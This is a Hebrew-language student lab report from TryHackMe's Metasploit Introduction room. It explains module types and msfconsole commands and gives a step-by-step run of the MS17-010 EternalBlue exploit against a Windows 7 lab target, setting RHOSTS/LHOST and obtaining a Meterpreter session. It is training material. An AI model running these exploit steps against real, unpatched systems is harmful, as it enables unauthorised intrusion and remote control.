🛡️ דוח PT – Metasploit Introduction

מאת: אילון מעיין
פלטפורמה: TryHackMe
שנה: 2025

<img width="1000" height="659" alt="image" src="https://github.com/user-attachments/assets/3ac11a78-0422-4b28-b9a5-3d510b8df263" />

מטרת התרגול הייתה ללמוד את מסגרת Metasploit, להבין את סוגי המודולים, ולהתנסות בתהליך תקיפה מלא כולל:

איתור חולשה

בחירת exploit

הגדרת פרמטרים

שליחת payload

קבלת Session

ניהול Post-Exploitation

בתרגול נוצלה חולשת MS17-010 EternalBlue על מכונת Windows 7.
החדר מחזק הבנה מעשית של תקיפה ריאלית ומהווה נדבך חשוב להכשרה כאנליסט סייבר.

📌 2. היקף (Scope)

הדוח כולל:

מבנה Metasploit Framework

הסבר קצר על סוגי המודולים

שימוש ב־msfconsole

חיפוש מודולים (search)

טעינת מודול (use)

הגדרת פרמטרים (set / setg)

ניצול EternalBlue

ניהול sessions

📌 3. יעדי התרגול

להבין את המבנה והמודולים של Metasploit

ללמוד לאתר exploits ולבחור פיילוד מתאים

להגדיר פרמטרים כמו RHOSTS/LHOST

לבצע ניצול מוצלח של חולשה אמיתית

לקבל shell ולהפעיל פקודות על היעד

להבין ניהול סשנים ו־post-exploitation

📌 4. מבט טכני קצר על Metasploit
🔹 4.1 מרכיבי המסגרת
רכיב	משמעות
msfconsole	הממשק המרכזי בו עובדים
Modules	יחידות פעולה: Exploit, Payload, Scanner וכו'
Payloads	קוד שרץ על היעד (Reverse shell, Meterpreter וכו')
Tools	כלים נוספים כמו msfvenom, pattern_create
🔹 4.2 סוגי מודולים בקצרה

Exploit – מנצל חולשה קיימת במערכת

Payload – קוד שמופעל לאחר הניצול

Auxiliary – סריקות, brute-force, בדיקות

Encoders – ניסיון לעקיפת אנטי־וירוס

Evasion – מודולים מתקדמים לעקיפת הגנות

NOPs – פקודות “ריקות” לייצוב מבנה פיילוד

Post – איסוף מידע על המערכת לאחר הפריצה

📌 5. מושגים בסיסיים (בקצרה)
מושג	הסבר
Vulnerability	חולשה/באג במערכת
Exploit	קוד שמנצל את החולשה
Payload	מה שרץ על המערכת אחרי ההצלחה
Session	ערוץ תקשורת שנפתח אחרי הניצול
📌 6. פקודות עיקריות
הפעלת msfconsole:
msfconsole

חיפוש מודולים:
search ms17-010
search apache
search type:auxiliary ssh

טעינת exploit:
use exploit/windows/smb/ms17_010_eternalblue

הצגת אפשרויות:
show options
<img width="778" height="567" alt="image" src="https://github.com/user-attachments/assets/e1ea3cdc-23ba-4802-b5ce-0daaab258610" />


הגדרת פרמטרים:
set RHOSTS <target-ip>
set LHOST <attackbox-ip>
set LPORT 4444

הגדרה גלובלית:
setg RHOSTS <ip>

ניקוי ערך:
unset PAYLOAD

הרצת exploit:
exploit

ניהול sessions:
sessions
sessions -i 1
background

ניקוי מסך בתוך Metasploit:
CTRL + L

📌 7. ניצול EternalBlue — סיכום מעשי

טעינת המודול:

use exploit/windows/smb/ms17_010_eternalblue


הגדרת RHOSTS:

set RHOSTS <victim-ip>


בדיקת דרישות:

show options


הרצת exploit:

exploit


קבלת Meterpreter:

meterpreter >


יציאה לרקע:

background
